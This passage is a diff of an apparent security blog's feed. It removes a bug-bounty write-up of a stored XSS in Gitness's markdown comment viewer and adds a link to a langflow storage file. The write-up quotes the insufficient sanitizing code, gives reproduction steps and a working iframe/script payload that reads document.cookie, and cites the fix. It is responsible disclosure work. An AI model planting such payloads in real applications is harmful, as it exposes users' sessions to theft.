-<p><a href="https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115">https://github.com/google/fhir-data-pipes/blob/5dd428c427ee8a5b3f784a9f36942c3815690414/pipelines/controller/src/main/java/com/google/fhir/analytics/ApiController.java#L115</a></p>]]></content><author><name></name></author><category term="file-inclusion" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Hackerone: Store XSS in Gitness markdown comment editor($100)</title><link href="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html" rel="alternate" type="text/html" title="Hackerone: Store XSS in Gitness markdown comment editor($100)" /><published>2024-05-11T10:31:06+08:00</published><updated>2024-05-11T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/05/11/store-xss-in-gitness-markdown-viewer.html"><![CDATA[<h2 id="name">Name</h2>
-
-<blockquote>
-  <p>Store XSS in Gitness markdown comment editor</p>
-</blockquote>
-
-<h2 id="weakness">Weakness</h2>
-
-<blockquote>
-  <p>CWE-79: Cross-site Scripting (XSS) - Stored</p>
-</blockquote>
-
-<h2 id="severity">Severity</h2>
-
-<blockquote>
-  <p>High (7.3)</p>
-</blockquote>
-
-<h2 id="description">Description</h2>
-
-<p>An attacker can send malicous description when creating a pull request, or comment with malicious payload bellow an existing PR. Due to improper using of <a href="https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security">react-markdown-preview component</a>, html tags is not fully sanitized, and can be rendered with xss payload.</p>
-
-<p>In <a href="https://github.com/harness/gitness/blame/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L144">MarkdownViewer.tsx rehypeRewrite</a>. The sanitizing is not sufficient, only <code class="language-plaintext highlighter-rouge">a, input, checkbox, link</code> is sanitized, the rest html can be injected arbitrarily.</p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;MarkdownPreview
-    key={flag ? hash : 0}
-    source={markdown}
-    skipHtml={true}
-    warpperElement=data-color-mode
-    rehypeRewrite={(node, _index, parent) =&gt; {
-        if ((node as unknown as HTMLDivElement).tagName === 'a') {
-        if (parent &amp;&amp; /^h(1|2|3|4|5|6)/.test((parent as unknown as HTMLDivElement).tagName)) {
-            parent.children = parent.children.slice(1)
-        }
-        ...
-        }
-        if (
-        (node as unknown as HTMLDivElement).tagName === 'input' &amp;&amp;
-        (node as Unknown as Element)?.properties?.type === 'checkbox'
-        ) {
-        const lineNumber = parent?.position?.start?.line ? parent?.position?.start?.line - 1 : 0
-        // eslint-disable-next-line @typescript-eslint/no-explicit-any
-        const element = node as any
-        element.properties['data-line-number'] = lineNumber.toString()
-        element.properties.disabled = !inDescriptionBox
-        }
-    }}
-    rehypePlugins={[
-        [rehypeVideo, { test: /\/(.*)(.mp4|.mov|.webm|.mkv|.flv)$/, details: null }],
-        [rehypeExternalLinks, { rel: ['nofollow noreferrer noopener'], target: '_blank' }]
-    ]}
-/&gt;
-</code></pre></div></div>
-
-<h2 id="proof-of-concept">Proof of Concept</h2>
-
-<ol>
-  <li>
-    <p>Create an gitness server, using following command from official tutorial:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> docker run -d \
- -p 3000:3000 \
- -v /var/run/docker.sock:/var/run/docker.sock \
- -v /tmp/gitness:/data \
- --name gitness \
- --restart always \
- harness/gitness
-</code></pre></div>    </div>
-  </li>
-  <li>
-    <p>Create an empty repository, such as: <code class="language-plaintext highlighter-rouge">xss-test</code></p>
-
-    <p><img src="/assets/images/bughunter/gitness/create-repo.png" alt="repo" /></p>
-  </li>
-  <li>
-    <p>Open <code class="language-plaintext highlighter-rouge">Branches</code> section, new branch <code class="language-plaintext highlighter-rouge">branch2</code>. After create new branch, checkout to <code class="language-plaintext highlighter-rouge">branch2</code> and create new file <code class="language-plaintext highlighter-rouge">test</code> with any content, and commit the change.</p>
-
-    <p><img src="/assets/images/bughunter/gitness/new-branch.png" alt="branch" /></p>
-  </li>
-  <li>
-    <p>Open <code class="language-plaintext highlighter-rouge">Pull Requests</code> section, create new pull request, set base to <code class="language-plaintext highlighter-rouge">main</code> branch and compare to <code class="language-plaintext highlighter-rouge">branch2</code> branch. In <code class="language-plaintext highlighter-rouge">Description</code> markdown editor, send payload <code class="language-plaintext highlighter-rouge">&lt;iframe srcdoc="&lt;script&gt;alert(document.cookie)&lt;/script&gt;"&gt;&lt;/iframe&gt;</code>, and press the button <code class="language-plaintext highlighter-rouge">create pull request</code>. After creating the pr, an alert should pop up.</p>
-  </li>
-</ol>
-
-<p><img src="/assets/images/bughunter/gitness/pr1.png" alt="branch" /></p>
-
-<p><img src="/assets/images/bughunter/gitness/alert.png" alt="branch" /></p>
-
-<h2 id="impact">Impact</h2>
-
-<p>Anyone who is capable to comment on pr or create pr can post a comment on a public project pull requests and injecting the xss.</p>
-
-<h2 id="reference">Reference</h2>
-
-<p><a href="https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security">https://github.com/uiwjs/react-markdown-preview?tab=readme-ov-file#security</a></p>
-
-<p>FIX:
-<a href="https://github.com/harness/gitness/commit/49f3bf151e89d59bad60b3d41b1341d7c5b66b17">https://github.com/harness/gitness/commit/49f3bf151e89d59bad60b3d41b1341d7c5b66b17</a></p>
-
-<h2 id="occurrences">Occurrences</h2>
-
-<p><a href="https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141">https://github.com/harness/gitness/blob/e31f33addea310b28a21ad1e05ab661acd163ef8/web/src/components/MarkdownViewer/MarkdownViewer.tsx#L141</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
+<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>
